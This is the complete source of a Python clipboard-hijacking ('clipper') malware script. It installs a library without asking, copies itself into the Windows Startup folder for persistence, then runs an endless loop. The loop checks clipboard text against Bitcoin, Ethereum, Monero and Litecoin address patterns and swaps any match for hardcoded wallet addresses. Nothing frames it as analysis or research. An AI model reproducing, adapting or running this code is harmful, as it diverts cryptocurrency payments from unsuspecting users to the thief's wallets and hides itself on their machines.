
import os
os.system("pip install pyperclip")
import pyperclip as pc
import time
import re
import time
import shutil


BTC_address = "bc1qj3g9d2vlpgwjxsdn85mszs56cnk6hw9dnkssv2"
ETH_address = "0x45a51D5d723D659833cE734DbF1A70E6A8DB8148"
MON_address  = "42LDa8z1vVMbeUmR1B21zuMk531YVYMk3JTRoVdVh5rrEM5eNugFSJCRyTQukSzR1uehyDkzniXnPeNwn6qEPSms6DF9gSj"
LTC_address = "ltc1qxagzjl6vcqurr8spn98e6nvkvcf07c37qr4m8h"



def add_to_startup():
    user = os.getlogin()
    basename = os.path.basename(__file__)
    shutil.copy(os.getcwd() + basename,'C:/Users/'+user+'/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/')

add_to_startup()

def clip():
    s = str(pc.paste())
    length_of_s = len(s)
    btc_check = re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", s)
    btc_match = bool(btc_check)
    eth_check = re.match("^0x[a-zA-F0-9]{40}$", s)
    eth_match = bool(eth_check)
    mon_check = re.match("^4([0-9]|[A-B])(.){93}$", s)
    mon_match = bool(mon_check)
    ltc_check = re.match("[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$", s)
    ltc_match = bool(ltc_check)
    wallet_check = ""
    time.sleep(0.25)
    if btc_match == True:
        pc.copy(BTC_address)
    elif eth_match == True:
        pc.copy(ETH_address)
    elif mon_match == True:
        pc.copy(MON_address)
    elif ltc_match == True:
        pc.copy(LTC_address)
    else:
        wallet_check = "ignore"


while True:
    clip()
